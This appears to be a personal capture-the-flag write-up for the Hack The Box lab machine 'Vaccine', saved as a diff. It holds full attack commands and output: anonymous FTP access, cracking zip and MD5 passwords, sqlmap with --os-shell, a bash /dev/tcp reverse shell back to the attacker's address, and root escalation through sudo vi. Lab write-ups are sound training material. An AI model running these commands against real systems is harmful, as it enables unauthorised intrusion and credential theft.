@@ -1,0 +1,155 @@
+┌──(kali㉿kali)-[~]
+└─$ nmap -sV 10.129.*.* -p-
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-11 08:45 +0100
+Nmap scan report for 10.129.*.*
+Host is up (0.057s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 29.59 seconds
+
+Task 1:
+ftp
+
+Task 2:
+anonymous
+
+Task 3:
+┌──(kali㉿kali)-[~]
+└─$ ftp anonymous@10.129.95.*.* 21                                                                                             
+Connected to 10.129.*.*.
+220 (vsFTPd 3.0.3)
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+229 Entering Extended Passive Mode (|||10800|)
+150 Here comes the directory listing.
+-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
+226 Directory send OK.
+ftp> 
+
+Task 4:
+zip2john
+
+Task 5:
+┌──(kali㉿kali)-[~]
+└─$ zip2john backup.zip
+ver 2.0 efh 5455 efh 7875 backup.....
+...
+...
+Saved the hash as a txt file, then:
+┌──(kali㉿kali)-[~]
+└─$ john hash.txt                                            
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 5 OpenMP threads
+Proceeding with single, rules:Single
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Proceeding with wordlist:/usr/share/john/password.lst
+741852963        (?)     
+1g 0:00:00:00 DONE 2/3 (2026-03-11 09:00) 25.00g/s 256000p/s 256000c/s 256000C/s 123456..marie1
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+Unzip the file with the password.
+Checking the source...
+" if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {"
+This line indicates, that the password is: 2cb42f8734ea607eefed3b70af13bbd3 in md5 format...so decrypt it. And the decrypted pw is: qwerty789
+
+Task 6:
+Check sqlmap --help...and the answer is --os-shell
+
+Task 7:
+Lets login in the browser with the credentials we have (admin/qwerty789). There is a search bar, and lower there is a database. This can be vulnerable to sql.
+Lets type smthing into it...like type "test" into it. 
+http://10.129.*.*/dashboard.php?search=test Is the url what we get back, so lets test this page with sqlmap.
+┌──(kali㉿kali)-[~]
+└─$ sqlmap -u "http://10.129.95.174/dashboard.php?search=test" --cookie="PHPSESSID=pbpprlhns49nnc4779csunnur9" --dbms=postgresql --batch --os-shell  
+///we need the phpsessid, because sqlmap should know that we are already logged in, in the browser with pressing F12, and navigating to the "storage" menu, we can find the ssid. We know that the postgresql database
+is already existing (--dbms=postgresql not really necessary), with --batch option the sqlmap will automatically answer the questions (default answers), 
+and as we see eralier with --os-shell the sqlmap will try to get access to the shell.
+
+Run this command and we will get access to the os-shell.
+
+NOW...lets do a reverse shell...
+In another terminal:
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 4444
+Then in os-shell:
+os-shell> bash -c 'bash -i >& /dev/tcp/10.10.*.*/4444 0>&1'   ///where 10.10.*.* is our ip address.
+And we will get our reverse shell:
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.16.247] from (UNKNOWN) [10.129.95.174] 35772
+bash: cannot set terminal process group (3075): Inappropriate ioctl for device
+bash: no job control in this shell
+postgres@vaccine:/var/lib/postgresql/11/main$
+Lets check the webservers directory:
+postgres@vaccine:/var/lib/postgresql/11/main$ ls -la /var/www/html
+ls -la /var/www/html
+total 392
+drwxr-xr-x 2 root root   4096 Jul 23  2021 .
+drwxr-xr-x 3 root root   4096 Jul 23  2021 ..
+-rw-rw-r-- 1 root root 362847 Feb  3  2020 bg.png
+-rw-r--r-- 1 root root   4723 Feb  3  2020 dashboard.css
+-rw-r--r-- 1 root root     50 Jan 30  2020 dashboard.js
+-rw-r--r-- 1 root root   2313 Feb  4  2020 dashboard.php
+-rw-r--r-- 1 root root   2594 Feb  3  2020 index.php
+-rw-r--r-- 1 root root   1100 Jan 30  2020 license.txt
+-rw-r--r-- 1 root root   3274 Feb  3  2020 style.css
+
+That Dashboard.php can be interesting...lets check it:
+postgres@vaccine:/var/lib/postgresql/11/main$ cat /var/www/html/dashboard.php
+In the file, there is an interesting line:
+ $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
+Next move, is that we need a normal shell..:
+postgres@vaccine:/var/lib/postgresql/11/main$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+<in$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+postgres@vaccine:/var/lib/postgresql/11/main$
+Now we can check sudo -l, to find out the answer...
+postgres@vaccine:/var/lib/postgresql/11/main$ sudo -l
+sudo -l
+[sudo] password for postgres: P@s5w0rd!
+
+Matching Defaults entries for postgres on vaccine:
+    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
+    XFILESEARCHPATH XUSERFILESEARCHPATH",
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    mail_badpass
+
+User postgres may run the following commands on vaccine:
+    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
+postgres@vaccine:/var/lib/postgresql/11/main$ 
+And here is our answer.../bin/vi...so the right answer is "vi"
+
+Getting the flag:
+So we have a user (postgres), a password (P@s5w0rd!),a possible vulnerable config file with /bin/vi (/etc/postgresql/11/main/pg_hba.conf) and an open ssh port...
+
+┌──(kali㉿kali)-[~]
+└─$ ssh postgres@10.129.95.174
+...
+...
+postgres@vaccine:~$ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
+
+This will open the pg_hba.conf file. Type into this:
+:!bash
+And when u press enter, the system will drop you into root shell:
+root@vaccine:/var/lib/postgresql# 
+
+Finding the user flag:
+root@vaccine:/home/simon# find / -name user.txt 2>/dev/null
+/var/lib/postgresql/user.txt
+root@vaccine:/home/simon# cat /var/lib/postgresql/user.txt
+
+And the root flag:
+root@vaccine:/var/lib/postgresql# cat /root/root.txt
